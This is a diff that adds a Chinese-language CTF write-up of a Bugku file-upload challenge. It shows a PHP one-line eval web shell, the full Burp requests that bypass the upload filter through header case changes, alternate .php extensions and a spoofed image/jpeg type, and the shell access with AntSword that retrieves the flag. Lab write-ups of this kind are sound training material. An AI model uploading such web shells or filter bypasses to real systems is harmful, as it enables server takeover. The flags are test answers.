@@ -2372,6 +2372,101 @@ flag{27be6f3753c7a1b12345a7a5a7d1127c}
 
 ------
 
+### 文件上传
+
+编写`PHP`一句话木马：
+
+```php
+<?php @eval($_POST['t0ur1st']); ?>
+```
+
+点击上传后，可以看到`Burp Suite`的请求如下：
+
+```
+POST /index.php HTTP/1.1
+Host: 114.67.175.224:12169
+Content-Length: 422
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+Origin: http://114.67.175.224:12169
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryR2qZKqgQHD5pKJDR
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.50 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Referer: http://114.67.175.224:12169/index.php
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9
+Cookie: PHPSESSID=0fca72f2b297818af57ac74271ef370b
+Connection: close
+
+------WebKitFormBoundaryR2qZKqgQHD5pKJDR
+Content-Disposition: form-data; name="file"; filename="6.php"
+Content-Type: application/octet-stream
+
+<?php @eval($_POST['t0ur1st']); ?>
+
+/*
+image=data%3Aimage%2Fphp%3Bbase64%2CPD9waHAgQGV2YWwoJF9QT1NUWyd0MHVyMXN0J10pOyA/Pg==
+*/
+------WebKitFormBoundaryR2qZKqgQHD5pKJDR
+Content-Disposition: form-data; name="submit"
+
+Submit
+------WebKitFormBoundaryR2qZKqgQHD5pKJDR--
+```
+
+请求头部的 `Content-Type` 内容，随便改个大写字母过滤掉，比如 `mulTipart/form-data`
+所上传的文件后缀改为 `.php4`，依次尝试`php4`，`phtml`，`phtm`，`phps`，`php5`（包括一些字母改变大小写）
+请求数据的 `Content-Type` 内容改为 `image/jpeg`。
+
+```
+POST /index.php HTTP/1.1
+Host: 114.67.175.224:12169
+Content-Length: 422
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+Origin: http://114.67.175.224:12169
+Content-Type: mulTipart/form-data; boundary=----WebKitFormBoundaryR2qZKqgQHD5pKJDR
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.50 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Referer: http://114.67.175.224:12169/index.php
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9
+Cookie: PHPSESSID=0fca72f2b297818af57ac74271ef370b
+Connection: close
+
+------WebKitFormBoundaryR2qZKqgQHD5pKJDR
+Content-Disposition: form-data; name="file"; filename="6.php4"
+Content-Type: image/jpeg
+
+<?php @eval($_POST['t0ur1st']); ?>
+
+/*
+image=data%3Aimage%2Fphp%3Bbase64%2CPD9waHAgQGV2YWwoJF9QT1NUWyd0MHVyMXN0J10pOyA/Pg==
+*/
+------WebKitFormBoundaryR2qZKqgQHD5pKJDR
+Content-Disposition: form-data; name="submit"
+
+Submit
+------WebKitFormBoundaryR2qZKqgQHD5pKJDR--
+```
+
+上传成功后可以看到
+
+> Upload Success
+> Stored in: [upload/bugku07095101_5795.php4](http://114.67.175.224:12169/upload/bugku07095101_5795.php4)
+
+使用蚁剑连接靶机，打开虚拟终端。
+
+```bash
+$ find / -name flag*
+$ cat /flag
+flag{fbd8c508888c770a01c094a4ba2f4c00}
+```
+
+提交`flag{fbd8c508888c770a01c094a4ba2f4c00}`即可。
+
+------
+
 ## CTFSHOW
 
 ### [七夕杯web签到](https://www.ctf.show/challenges#web%E7%AD%BE%E5%88%B0-3767)
